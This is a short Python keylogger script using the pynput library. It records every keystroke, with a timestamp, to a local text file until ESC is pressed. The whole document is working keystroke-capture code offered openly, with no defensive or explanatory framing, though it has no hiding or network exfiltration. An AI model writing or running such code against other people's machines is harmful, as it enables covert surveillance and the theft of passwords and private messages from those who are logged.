from pynput import keyboard
from datetime import datetime

# File to store recorded keystrokes with timestamp
log_file = "keylog_timestamp.txt"

def on_press(key):
    """Log each key pressed along with the current timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Format time

    try:
        # For normal character keys
        key_data = f"{timestamp} - {key.char}\n"
    except AttributeError:
        # For special keys like Enter, Space, Backspace, etc.
        key_data = f"{timestamp} - [{key}]\n"

    # Write data to log file
    with open(log_file, "a") as file:
        file.write(key_data)

def on_release(key):
    """Stop keylogger when ESC key is pressed."""
    if key == keyboard.Key.esc:
        return False

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
